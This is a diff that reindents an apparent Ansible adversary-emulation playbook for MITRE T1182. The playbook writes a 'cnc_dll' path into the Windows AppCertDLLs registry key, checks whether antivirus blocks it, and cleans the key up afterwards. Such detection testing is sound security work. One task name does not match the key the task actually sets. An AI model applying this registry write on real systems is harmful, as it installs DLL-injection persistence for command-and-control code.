@@ -12,10 +12,10 @@
     - name: Attaches Command Prompt As Debugger To Process - osk
       tags: always
       win_regedit:
-      	path: HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs
-        name: Debugger
-        data: c:\temp\"{{ cnc_dll }}"
-        type: expandstring
+       path: HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs
+       name: Debugger
+       data: c:\temp\"{{ cnc_dll }}"
+       type: expandstring
     - name: sleep for 10 seconds and continue with play to check if AV removed or Not
       tags: always
       wait_for: timeout=10
@@ -24,8 +24,8 @@
       tags: always
       win_reg_stat:
     	path: HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs
-        name: Debugger
-        register: T1182
+       name: Debugger
+       register: T1182
     - name: check if playbook was blocked
       tags: always
       debug: msg="Playbook Completed#T1182#blocked#win#"
@@ -37,7 +37,7 @@
     - name: CleanUp REG
       tags: always
       win_regedit:
-        path: HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs
-        state: absent
+       path: HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDLLs
+       state: absent
       when: T1182.exists
 
